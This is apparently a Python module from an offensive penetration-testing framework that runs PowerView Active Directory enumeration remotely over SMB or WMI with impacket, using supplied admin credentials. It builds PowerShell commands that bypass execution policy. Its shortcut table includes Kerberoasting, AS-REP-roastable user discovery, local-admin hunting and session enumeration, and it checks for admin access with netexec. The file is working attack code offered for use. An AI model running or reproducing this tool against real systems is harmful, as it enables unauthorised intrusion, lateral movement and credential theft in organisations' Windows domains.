"""
Remote PowerView Execution Module
Execute PowerView commands remotely via SMB/WinRM
"""

import subprocess
import os
import tempfile
from typing import Optional, List
from core.module_base import ModuleBase, ModuleType, Platform, find_tool


class PowerViewRemote(ModuleBase):
    """
    Execute PowerView commands remotely on a Windows target
    Requires admin access to the target
    """

    def __init__(self):
        super().__init__()
        self.name = "powerview_remote"
        self.description = "Execute PowerView commands remotely via SMB exec"
        self.author = "UwU Toolkit"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = ["ad", "powerview", "remote", "windows", "enumeration"]

        # Register options
        self.register_option("RHOSTS", "Target Windows host IP", required=True)
        self.register_option("DOMAIN", "Domain name", required=True)
        self.register_option("USER", "Username with admin access", required=True)
        self.register_option("PASS", "Password", required=True)
        self.register_option("COMMAND", "PowerView command to execute", required=True)
        self.register_option("METHOD", "Execution method: smbexec, wmiexec, psexec",
                           default="smbexec", choices=["smbexec", "wmiexec", "psexec"])
        self.register_option("POWERVIEW_PATH", "Path to PowerView.ps1 on target",
                           default="C:\\Tools\\PowerView.ps1")

        # Common PowerView commands for reference
        self.powerview_commands = {
            "sid": "Convert-NameToSid {target}",
            "sid_to_name": "Convert-SidToName {target}",
            "domain": "Get-Domain",
            "domain_policy": "Get-DomainPolicy",
            "trusts": "Get-DomainTrustMapping",
            "users": "Get-DomainUser | Select-Object samaccountname",
            "user_info": "Get-DomainUser -Identity {target}",
            "groups": "Get-DomainGroup | Select-Object cn",
            "group_members": "Get-DomainGroupMember -Identity '{target}'",
            "computers": "Get-DomainComputer | Select-Object dnshostname",
            "dcs": "Get-DomainController",
            "ous": "Get-DomainOU | Select-Object name",
            "gpos": "Get-DomainGPO | Select-Object displayname",
            "spn_users": "Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname",
            "asrep_users": "Get-DomainUser -PreauthNotRequired | Select-Object samaccountname",
            "kerberoast": "Invoke-Kerberoast",
            "acl": "Get-ObjectAcl -Identity {target} -ResolveGUIDs",
            "shares": "Get-NetShare -ComputerName {target}",
            "sessions": "Get-NetSession -ComputerName {target}",
            "loggedon": "Get-NetLoggedon -ComputerName {target}",
            "local_admin": "Find-LocalAdminAccess",
            "admin_access": "Test-AdminAccess -ComputerName {target}",
        }

    def run(self) -> bool:
        target = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        command = self.get_option("COMMAND")
        method = self.get_option("METHOD")
        pv_path = self.get_option("POWERVIEW_PATH")

        # Check for execution tool
        tool_path = find_tool(f"{method}.py")
        if not tool_path:
            self.print_error(f"{method}.py not found")
            return False

        # Build the PowerShell command
        ps_cmd = self._build_ps_command(command, pv_path)

        self.print_status(f"Target: {target}")
        self.print_status(f"Method: {method}")
        self.print_status(f"Command: {ps_cmd}")

        # Execute remotely
        return self._execute_remote(tool_path, target, domain, user, password, ps_cmd)

    def _build_ps_command(self, command: str, pv_path: str) -> str:
        """Build PowerShell command with PowerView import"""
        # If it's a shortcut command, expand it
        if command in self.powerview_commands:
            command = self.powerview_commands[command]

        # Build full command
        full_cmd = f"powershell -ep bypass -c \"Import-Module {pv_path}; {command}\""
        return full_cmd

    def _execute_remote(self, tool_path: str, target: str, domain: str,
                       user: str, password: str, ps_cmd: str) -> bool:
        """Execute command via impacket tool"""
        auth_string = f"{domain}/{user}:{password}@{target}"

        cmd = [
            "python3", tool_path,
            auth_string,
            ps_cmd
        ]

        self.print_status(f"Executing: {' '.join(cmd[:3])} [command]")

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120
            )

            if result.stdout:
                self.print_good("Output:")
                self.print_line(result.stdout)

            if result.stderr:
                self.print_warning("Stderr:")
                self.print_line(result.stderr)

            return result.returncode == 0

        except subprocess.TimeoutExpired:
            self.print_error("Command timed out")
            return False
        except Exception as e:
            self.print_error(f"Execution failed: {e}")
            return False

    def check(self) -> bool:
        """Check if we have admin access"""
        target = self.get_option("RHOSTS")
        user = self.get_option("USER")
        password = self.get_option("PASS")

        nxc = find_tool("nxc") or find_tool("netexec")
        if not nxc:
            return False

        result = subprocess.run(
            [nxc, "smb", target, "-u", user, "-p", password],
            capture_output=True, text=True
        )

        return "(admin)" in result.stdout or "(Pwn3d!)" in result.stdout
